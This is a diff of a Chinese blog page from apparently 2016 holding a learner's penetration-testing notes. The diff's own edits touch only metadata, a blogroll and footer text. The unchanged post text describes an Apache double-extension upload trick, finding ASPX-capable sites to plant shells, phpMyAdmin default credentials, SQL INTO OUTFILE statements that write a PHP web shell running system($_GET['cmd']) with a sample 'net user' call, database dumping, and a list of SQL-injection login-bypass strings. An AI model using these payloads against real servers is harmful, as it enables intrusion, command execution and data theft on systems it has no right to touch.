@@ -84,19 +84,16 @@
 
 
 
-<meta name="description" content="0x00 linux解析格式：1.php.xxx (xxx可以是任意)如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被服务器当做PHP脚本解析。辨别linux系统方法，例如：http://www.xxx.com/xxx/abc.asp?id=125 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统
-0x01 旁注旁注的技巧就是">
+<meta name="description" content="0x00 linux解析格式：1.php.xxx (xxx可以是任意)如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被服务器当做PHP脚本解析。辨别linux系统方法，例如：http://www.xxx.com/xxx/abc.asp?id=125 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统">
 <meta property="og:type" content="article">
 <meta property="og:title" content="渗透学习第一阶段总结[2]">
 <meta property="og:url" content="http://lovexiaofeng.cn/2016/07/02/15/index.html">
 <meta property="og:site_name" content="小峰's Blog">
-<meta property="og:description" content="0x00 linux解析格式：1.php.xxx (xxx可以是任意)如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被服务器当做PHP脚本解析。辨别linux系统方法，例如：http://www.xxx.com/xxx/abc.asp?id=125 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统
-0x01 旁注旁注的技巧就是">
-<meta property="og:updated_time" content="2016-07-03T01:12:11.638Z">
+<meta property="og:description" content="0x00 linux解析格式：1.php.xxx (xxx可以是任意)如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被服务器当做PHP脚本解析。辨别linux系统方法，例如：http://www.xxx.com/xxx/abc.asp?id=125 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统">
+<meta property="og:updated_time" content="2016-07-30T11:29:39.082Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="渗透学习第一阶段总结[2]">
-<meta name="twitter:description" content="0x00 linux解析格式：1.php.xxx (xxx可以是任意)如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被服务器当做PHP脚本解析。辨别linux系统方法，例如：http://www.xxx.com/xxx/abc.asp?id=125 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统
-0x01 旁注旁注的技巧就是">
+<meta name="twitter:description" content="0x00 linux解析格式：1.php.xxx (xxx可以是任意)如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被服务器当做PHP脚本解析。辨别linux系统方法，例如：http://www.xxx.com/xxx/abc.asp?id=125 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统">
 
 
 
@@ -260,7 +257,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">发表于</span>
+            <span class="post-meta-item-text">更新于</span>
             <time itemprop="dateCreated" datetime="2016-07-02T20:20:40+08:00" content="2016-07-02">
               2016-07-02
             </time>
@@ -289,7 +286,7 @@
       
 
       
-        <h2 id="0x00-linux"><a href="#0x00-linux" class="headerlink" title="0x00 linux"></a>0x00 linux</h2><p>解析格式：1.php.xxx (xxx可以是任意)<br>如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被服务器当做PHP脚本解析。<br>辨别linux系统方法，例如：<a href="http://www.xxx.com/xxx/abc.asp?id=125" target="_blank" rel="external">http://www.xxx.com/xxx/abc.asp?id=125</a> 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统</p>
+        <h2 id="0x00-linux"><a href="#0x00-linux" class="headerlink" title="0x00 linux"></a>0x00 linux</h2><p>解析格式：1.php.xxx (xxx可以是任意)<br>如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被服务器当做PHP脚本解析。<br>辨别linux系统方法，例如：<a href="http://www.xxx.com/xxx/abc.asp?id=125" target="_blank" rel="external">http://www.xxx.com/xxx/abc.asp?id=125</a> 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统<br><a id="more"></a> </p>
 <h2 id="0x01-旁注"><a href="#0x01-旁注" class="headerlink" title="0x01 旁注"></a>0x01 旁注</h2><p>旁注的技巧就是挑选支持aspx的站来日，这样提权时候希望较大，如何探测服务器上哪些站点支持aspx呢? 利用bing搜索：<a href="http://cn.bing.com/" target="_blank" rel="external">http://cn.bing.com/</a> 搜索格式：ip:服务器ip aspx<br>比如要入侵一个网站，想知道该网站支不支持aspx，就在网站后面随便加上一个xxx.aspx回车，如果显示的不是iis默认的错误页面，而是这种：“/”应用程序中的服务器错误，说明支持aspx马。</p>
 <h2 id="0x02-phpmyadmin"><a href="#0x02-phpmyadmin" class="headerlink" title="0x02 phpmyadmin"></a>0x02 phpmyadmin</h2><p>查看版本：test.php 或 phpinfo.php<br>默认账号密码：root root<br>万能帐号密码：’localhost’@’@” 密码空<br>拿shell第一种方法：</p>
 <pre><code>CREATE TABLE `mysql`.`darkmoon` (`darkmoon1` TEXT NOT NULL );
@@ -306,7 +303,6 @@ Drop TABLE IF EXISTS moon;
 </code></pre><p>拿shell第四种方法</p>
 <pre><code>select &apos;&lt;?php echo \&apos;&lt;pre&gt;\&apos;;system($_GET[\&apos;cmd\&apos;]); echo \&apos;&lt;/pre&gt;\&apos;; ?&gt;&apos; INTO OUTFILE &apos;d:/wamp/www/darkmoon4.php&apos;
 </code></pre><p>127.0.0.1/darkmoon4.php?cmd=net user<br>找到mysql数据库，执行sql语句即可写入一句话，再菜刀连接即可。<br>phpmyadmin脱裤：在这里面是可以直接拖库的，如同上传php拖库脚本一样，操作差不多的。<br>修改mysql默认的root用户名方法:<br>进入phpmyadmin,进入mysql表,执行sql语句<br>         1.update user set user=’你的新root用户名’ where user=’root’;<br>         2.flush privileges;<br>例如：<br>用root身份登入，进入mysql库，修改user表即可。<br>         1.use mysql;<br>         2.mysql&gt;update user set user=’newName’ where user=’root’;<br>         3.mysql&gt; flush privileges;   </p>
-<a id="more"></a>
 <h2 id="0x03-万能密码"><a href="#0x03-万能密码" class="headerlink" title="0x03 万能密码"></a>0x03 万能密码</h2><pre><code>&apos;xor
 &apos;or&apos;=&apos;or&apos;
 &apos;or&apos;&apos;=&apos;&apos;or&apos;&apos;=&apos;
@@ -506,7 +502,7 @@ function chencklogin()
             文章目录
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview">
-            站点概览
+            博主简介
           </li>
         </ul>
       
@@ -589,6 +585,40 @@ function chencklogin()
 
         
         
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://leelie.github.io" title="伟哥's Blog" target="_blank">伟哥's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wkh.dropsec.xyz/" title="加油、未来's Blog" target="_blank">加油、未来's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://scorpoin.github.io" title="棟棟's Blog" target="_blank">棟棟's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.sina.com.cn/u/5619564526" title="磊磊's Blog" target="_blank">磊磊's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://liulangdelmao.github.io/" title="小卓's Blog" target="_blank">小卓's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://nouername.github.io" title="飞妹妹's Blog" target="_blank">飞妹妹's Blog</a>
+                </li>
+              
+            </ul>
+          </div>
+        
 
       </section>
 
@@ -626,13 +656,13 @@ function chencklogin()
 </div>
 
 <div class="powered-by">
-  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+  由 <a class="theme-link" href="https://lovexiaofeng.cn">小峰</a> 强力推荐
 </div>
 
 <div class="theme-info">
-  主题 -
-  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
-    NexT.Pisces
+  博主 -
+  <a class="theme-link" href="https://lovexiaofeng.cn">
+    小峰
   </a>
 </div>
 
